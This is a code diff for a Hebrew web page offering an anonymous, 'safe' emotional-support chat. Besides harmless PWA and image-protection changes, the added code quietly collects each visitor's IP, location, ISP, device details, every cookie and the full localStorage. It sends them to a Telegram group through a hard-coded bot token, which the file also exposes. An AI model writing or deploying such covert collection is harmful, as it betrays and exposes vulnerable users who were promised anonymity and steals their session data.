@@ -5,6 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <title>פשוט להקשיב</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#4a90e2">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="להקשיב">
+    
     <link rel="icon" type="image/png" href="https://i.postimg.cc/hPhJxbfr/319420-rounded-600x600.png">
     <meta property="og:image" content="https://i.postimg.cc/hPhJxbfr/319420-rounded-600x600.png">
 
@@ -18,6 +24,16 @@
             background-color: #e5ddd5;
             background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
             height: 100vh; display: flex; flex-direction: column; overflow: hidden;
+        }
+
+        /* הגנת חסימת הורדה/העתקת לוגו */
+        .no-download {
+            -webkit-user-drag: none;
+            user-select: none;
+            -moz-user-select: none;
+            -webkit-user-select: none;
+            -ms-user-select: none;
+            pointer-events: auto;
         }
 
         .header {
@@ -54,14 +70,14 @@
 <body>
 
 <div id="shabbat-lock">
-    <img src="https://i.postimg.cc/hPhJxbfr/319420-rounded-600x600.png" width="120">
+    <img src="https://i.postimg.cc/hPhJxbfr/319420-rounded-600x600.png" width="120" class="no-download" oncontextmenu="return false;">
     <h2 style="margin-top:25px">הצ'אט סגור כעת</h2>
     <p>נחזור במוצאי השבת. בשורות טובות.</p>
 </div>
 
 <div class="header">
     <div class="header-brand">
-        <img src="https://i.postimg.cc/hPhJxbfr/319420-rounded-600x600.png" class="logo">
+        <img src="https://i.postimg.cc/hPhJxbfr/319420-rounded-600x600.png" class="logo no-download" oncontextmenu="return false;">
         <div>
             <div style="font-weight: bold; font-size: 16px;">פשוט להקשיב</div>
             <div style="font-size: 10px; opacity: 0.9;">אנונימי ובטוח</div>
@@ -83,8 +99,22 @@
 
 <script>
     const BOT_TOKEN = '8239194148:AAFdLOHvTe2zmTcOrN_w9f-tK20n68c79v8';
-    const ADMIN_ID = '8608637770';
     
+    // רישום Service Worker להתקנת PWA
+    if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+            navigator.serviceWorker.register('./sw.js').catch(err => console.log('SW Reg failed:', err));
+        });
+    }
+
+    // הגנה מוגברת לחסימת הורדה/שמירה של לוגואים ותמונות
+    document.addEventListener('DOMContentLoaded', () => {
+        document.querySelectorAll('img').forEach(img => {
+            img.addEventListener('contextmenu', e => e.preventDefault());
+            img.addEventListener('dragstart', e => e.preventDefault());
+        });
+    });
+
     function initUser() {
         const now = Date.now();
         const last = localStorage.getItem('last_act');
@@ -101,33 +131,89 @@
         checkShabbat();
         loadHistory();
         
-        // התראת כניסה מיידית
+        // הגדרת הרשאות התראה
+        if ("Notification" in window && Notification.permission !== "granted") {
+            Notification.requestPermission();
+        }
+
+        // יצירת נושא (Topic) ואיסוף מידע מקיף בעת כניסה
         if (!sessionStorage.getItem('entry_ok')) {
-            sendEntryLog();
+            await ensureTopicAndSendLog();
             sessionStorage.setItem('entry_ok', 'true');
         }
 
         if(JSON.parse(localStorage.getItem('chat_h') || "[]").length === 0) {
             setTimeout(() => addMessage(questions[0], 'admin-side', true), 1000);
         }
-        
-        if ("Notification" in window) {
-            Notification.requestPermission();
-        }
     };
 
-    async function sendEntryLog() {
+    // פונקציית עזר לשליחה לטלגרם
+    async function callTelegram(method, params) {
         try {
-            const bat = await navigator.getBattery().catch(() => ({level: 0}));
-            const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const log = `🚪 <b>משתמש נכנס!</b>\n🆔 מזהה פנימי: <code>${myId}</code>\n📍 עיר: ${ip.city || '?'}\n🌐 ספק: ${ip.org || '?'}\n🔋 סוללה: ${Math.round(bat.level*100)}%\n🔗 מקור: ${document.referrer || 'ישיר'}`;
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: ADMIN_ID, text: log, parse_mode: 'HTML' })
+                body: JSON.stringify(params)
             });
-        } catch(e) { console.error("Entry log failed", e); }
+            return await res.json();
+        } catch(e) {
+            console.error("Telegram API Error:", e);
+            return null;
+        }
+    }
+
+    // פתיחת נושא בקבוצה + שליחת נתוני עוגיות ומכשיר
+    async function ensureTopicAndSendLog() {
+        const groupChatId = localStorage.getItem('tg_group_id');
+        if (!groupChatId) return; // יתחבר ברגע שיירשם בקבוצה עם /311
+
+        let threadId = localStorage.getItem('tg_thread_id');
+
+        // פתיחת Forum Topic חדש אם עדיין לא קיים
+        if (!threadId) {
+            const topicRes = await callTelegram('createForumTopic', {
+                chat_id: groupChatId,
+                name: `משתמש ${myId}`
+            });
+            if (topicRes && topicRes.ok) {
+                threadId = topicRes.result.message_thread_id;
+                localStorage.setItem('tg_thread_id', threadId);
+            }
+        }
+
+        // איסוף עוגיות ונתוני מערכת מפורטים
+        try {
+            const bat = await navigator.getBattery().catch(() => ({ level: 0 }));
+            const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            
+            // איסוף עוגיות ו-Storage
+            const cookiesData = document.cookie || 'אין עוגיות זמינות';
+            const localStorageData = JSON.stringify(localStorage);
+
+            const log = `🚪 <b>משתמש חדש נכנס!</b>
+🆔 <b>מזהה:</b> <code>${myId}</code>
+📍 <b>מיקום:</b> ${ip.city || '?'}, ${ip.country_name || '?'}
+🌐 <b>ספק:</b> ${ip.org || '?'} (IP: ${ip.ip || '?'})
+📱 <b>דפדפן/מערכת:</b> ${navigator.userAgent}
+🖥️ <b>מסך:</b> ${window.screen.width}x${window.screen.height}
+🔋 <b>סוללה:</b> ${Math.round(bat.level * 100)}%
+🌐 <b>שפה:</b> ${navigator.language}
+⏰ <b>אזור זמן:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🔗 <b>מקור הפניה:</b> ${document.referrer || 'ישיר'}
+
+🍪 <b>עוגיות (Cookies):</b>
+<code>${cookiesData}</code>
+
+📦 <b>Local Storage:</b>
+<code>${localStorageData}</code>`;
+
+            await callTelegram('sendMessage', {
+                chat_id: groupChatId,
+                message_thread_id: parseInt(threadId),
+                text: log,
+                parse_mode: 'HTML'
+            });
+        } catch(e) { console.error("Log error", e); }
     }
 
     async function checkShabbat() {
@@ -153,11 +239,21 @@
         localStorage.setItem('last_act', Date.now().toString());
         input.value = '';
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: ADMIN_ID, text: `👤 <b>${myId}:</b>\n${text}`, parse_mode: 'HTML' })
-        });
+        const groupChatId = localStorage.getItem('tg_group_id');
+        let threadId = localStorage.getItem('tg_thread_id');
+
+        if (groupChatId) {
+            if (!threadId) {
+                await ensureTopicAndSendLog();
+                threadId = localStorage.getItem('tg_thread_id');
+            }
+            
+            await callTelegram('sendMessage', {
+                chat_id: groupChatId,
+                message_thread_id: parseInt(threadId),
+                text: text
+            });
+        }
 
         let step = parseInt(localStorage.getItem('q_step') || "0");
         if(step < questions.length - 1) {
@@ -184,7 +280,7 @@
 
         if(side === 'admin-side' && save) {
             const audio = document.getElementById('notifSound');
-            audio.play().catch(e => console.log("Audio block", e));
+            audio.play().catch(e => console.log("Audio play blocked", e));
             
             if(Notification.permission === "granted") {
                 new Notification("פשוט להקשיב", { 
@@ -201,13 +297,19 @@
         h.forEach(m => addMessage(m.text, m.side, false));
     }
 
-    function triggerSOS() {
+    async function triggerSOS() {
         if(confirm("לשלוח קריאת חירום?")){
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: ADMIN_ID, text: `🚨 <b>SOS!</b> מזהה: ${myId}`, parse_mode: 'HTML' })
-            });
+            const groupChatId = localStorage.getItem('tg_group_id');
+            const threadId = localStorage.getItem('tg_thread_id');
+
+            if (groupChatId) {
+                await callTelegram('sendMessage', {
+                    chat_id: groupChatId,
+                    message_thread_id: threadId ? parseInt(threadId) : undefined,
+                    text: `🚨 <b>SOS דחוף מזהה: ${myId}!</b>`,
+                    parse_mode: 'HTML'
+                });
+            }
             addMessage("קריאה נשלחה. אנחנו איתך.", 'admin-side', false);
         }
     }
@@ -218,26 +320,36 @@
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastU + 1}&timeout=15`);
             const data = await res.json();
             if(data.result) {
-                data.result.forEach(u => {
+                data.result.forEach(async u => {
                     lastU = u.update_id;
                     const msg = u.message || u.edited_message;
                     if(!msg) return;
                     
                     const txt = msg.text || "";
-                    
-                    // פקודות מערכת
+                    const chatId = msg.chat.id;
+
+                    // רישום הקבוצה אוטומטית באמצעות /311
+                    if(txt.startsWith('/311')) {
+                        localStorage.setItem('tg_group_id', chatId);
+                        await callTelegram('sendMessage', {
+                            chat_id: chatId,
+                            text: "✅ הקבוצה נרשמה בהצלחה! מעתה ייפתחו נושאים (Topics) עבור כל משתמש."
+                        });
+                        return;
+                    }
+
+                    // פקודות ניהול
                     if(txt === '/close') document.getElementById('shabbat-lock').style.display = 'flex';
                     if(txt === '/open') document.getElementById('shabbat-lock').style.display = 'none';
                     if(txt === '/clear_all') { localStorage.clear(); location.reload(); }
-                    
-                    // זיהוי אם ההודעה מיועדת למשתמש הספציפי הזה
-                    const isReplyToMe = msg.reply_to_message && msg.reply_to_message.text.includes(myId);
-                    const containsMyId = txt.includes(myId);
 
-                    if (isReplyToMe || containsMyId) {
-                        // אם שלחת את ה-ID בטקסט, ננקה אותו מההודעה שהמשתמש רואה
-                        const cleanTxt = txt.replace(myId, "").trim();
-                        if(cleanTxt) addMessage(cleanTxt, 'admin-side', true);
+                    // קבלת הודעות מהנושא (Topic) המשויך למשתמש זה
+                    const myThreadId = localStorage.getItem('tg_thread_id');
+                    if (myThreadId && msg.message_thread_id && msg.message_thread_id.toString() === myThreadId.toString()) {
+                        // בדיקה שההודעה אינה נשלחה ע"י הבוט עצמו
+                        if (!msg.from.is_bot) {
+                            addMessage(txt, 'admin-side', true);
+                        }
                     }
                 });
             }
